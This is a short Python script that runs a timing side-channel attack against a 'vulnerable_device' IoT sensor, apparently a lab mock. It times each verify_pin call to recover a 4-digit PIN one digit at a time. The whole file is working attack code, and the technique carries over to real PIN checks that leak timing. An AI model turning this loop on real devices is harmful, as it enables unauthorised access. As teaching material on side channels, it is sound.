import time
from vulnerable_device import IoTSensor

def timing_attack():
    device = IoTSensor()
    guessed_pin = ""
    pin_length = 4
    
    print(f"[*] Starting Timing Attack on IoT Device...")
    
    for i in range(pin_length):
        best_char = ""
        max_time = 0
        
        for char in "0123456789":
            trial_pin = guessed_pin + char + "0" * (pin_length - len(guessed_pin) - 1)
            
            start = time.perf_counter()
            device.verify_pin(trial_pin)
            end = time.perf_counter()
            
            duration = end - start
            
            if duration > max_time:
                max_time = duration
                best_char = char
                
        guessed_pin += best_char
        print(f"[+] Found digit {i+1}: {best_char} (Response time: {max_time:.4f}s)")

    print(f"[\!] Attack Complete! Cracked PIN: {guessed_pin}")

if __name__ == "__main__":
    timing_attack()